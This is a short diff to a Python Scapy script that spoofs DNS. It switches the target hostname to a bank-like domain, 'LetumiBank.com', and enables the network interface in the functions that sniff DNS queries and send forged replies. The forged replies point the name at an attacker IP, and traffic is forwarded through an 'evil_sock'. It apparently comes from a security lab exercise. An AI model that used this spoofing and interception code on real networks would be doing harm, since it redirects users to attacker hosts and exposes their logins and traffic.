@@ -11,7 +11,7 @@ if 'Darwin' == os.uname().sysname:
 else:
     INTERFACE = "lo"
 WEB_PORT = 8000
-HOSTNAME = "gurgurtelem.com"
+HOSTNAME = "LetumiBank.com"
 
 
 def resolve_hostname(hostname):
@@ -83,7 +83,7 @@ def dns_callback(packet, *extra_args):
         DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd,
             an=DNSRR(rrname=HOSTNAME, rdata=attacker_ip))
     send(payload, 
-    # iface=INTERFACE
+    iface=INTERFACE
     )
     handle_tcp_forwarding(evil_sock, attacker_ip, HOSTNAME)
 
@@ -101,7 +101,7 @@ def sniff_and_spoof(attacker_ip):
           lfilter=lambda p: p.haslayer(
               DNSQR) and HOSTNAME in p[DNSQR].qname.decode() and p[DNS].qr == 0,
           count=0,
-        #   iface=INTERFACE
+          iface=INTERFACE
           )
 
 
